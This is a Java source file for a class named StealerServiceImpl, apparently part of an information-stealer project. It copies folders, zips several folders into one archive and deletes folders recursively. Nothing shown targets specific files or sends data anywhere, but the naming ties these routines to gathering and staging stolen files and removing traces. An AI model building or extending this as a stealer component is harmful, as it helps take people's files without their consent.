package com.stealer.service;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class StealerServiceImpl implements StealerService {

    @Override
    public void copyFolder(File sourceFolder, File destinationFolder) throws IOException {
        if (sourceFolder.isDirectory()) {
            if (!destinationFolder.exists()) {
                destinationFolder.mkdir();
            }
            String[] files = sourceFolder.list();
            for (String file : files) {
                File srcFile = new File(sourceFolder, file);
                File destFile = new File(destinationFolder, file);
                copyFolder(srcFile, destFile);
            }
        } else {
            copyFile(sourceFolder, destinationFolder);
        }
    }

    @Override
    public void copyFile(File sourceFile, File destinationFile) throws IOException {
        FileInputStream fis = new FileInputStream(sourceFile);
        FileOutputStream fos = new FileOutputStream(destinationFile);
        byte[] buffer = new byte[1024];
        int length;
        while ((length = fis.read(buffer)) > 0) {
            fos.write(buffer, 0, length);
        }
        fis.close();
        fos.close();
    }

    @Override
    public void zipFolder(String[] sourceFolders, String destinationZipFile) {
        try {
            FileOutputStream fos = new FileOutputStream(destinationZipFile);
            ZipOutputStream zos = new ZipOutputStream(fos);

            for (String folderPath : sourceFolders) {
                File folder = new File(folderPath);
                addFolderToZip("", folder, zos);
            }

            zos.close();
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void addFolderToZip(String baseFolderPath, File folder, ZipOutputStream zip) throws IOException {
        String folderPath = baseFolderPath + File.separator + folder.getName();
        zip.putNextEntry(new ZipEntry(folderPath + File.separator));

        File[] files = folder.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    addFolderToZip(folderPath, file, zip);
                } else {
                    addFileToZip(folderPath, file, zip);
                }
            }
        }

        zip.closeEntry();
    }

    @Override
    public void addFileToZip(String folderPath, File file, ZipOutputStream zip) throws IOException {
        String filePath = folderPath + File.separator + file.getName();
        zip.putNextEntry(new ZipEntry(filePath));

        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] buffer = new byte[1024];
            int length;
            while ((length = fis.read(buffer)) > 0) {
                zip.write(buffer, 0, length);
            }
        }

        zip.closeEntry();
    }

    @Override
    public void deleteFolder(File folder) {
        File[] files = folder.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    deleteFolder(file);
                } else {
                    file.delete();
                }
            }
        }
        folder.delete();
    }
}
